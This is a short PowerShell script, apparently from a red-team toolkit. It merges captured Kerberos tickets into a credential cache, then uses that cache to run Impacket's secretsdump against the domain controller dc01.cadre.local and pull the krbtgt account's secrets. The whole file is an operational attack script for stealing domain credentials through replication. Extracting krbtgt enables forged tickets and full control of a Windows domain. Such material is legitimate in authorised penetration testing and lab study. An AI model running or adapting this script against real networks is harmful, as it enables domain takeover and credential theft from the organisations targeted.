[CmdletBinding()]
param()
$ErrorActionPreference = "Continue"

$py = 'C:\Tools\RedStrike\.venv\Scripts\python.exe'
if (-not (Test-Path $py)) { $py = 'python' }
$sd = 'C:\Tools\RedStrike\.venv\Scripts\secretsdump.py'
$ccache = "C:\Tools\cadre-attack\T102-capture\EA-full.ccache"
$merge = 'C:\Tools\cadre-attack\merge_kirbis.py'

& $py $merge $ccache "C:\Tools\cadre-attack\T102-capture\EA-aes.kirbi" "C:\Tools\cadre-attack\T102-capture\EA-referral.kirbi" "C:\Tools\cadre-attack\T102-capture\EA-ldap.kirbi" 2>&1 | ForEach-Object { Write-Output "MERG|$_" }

$env:KRB5CCNAME = $ccache
Write-Output "--- secretsdump cadre.local krbtgt via merged ccache ---"
& $py $sd 'cadre.local/Administrator@dc01.cadre.local' -k -no-pass -just-dc-user 'cadre/krbtgt' 2>&1 | ForEach-Object { Write-Output "SD|$_" }
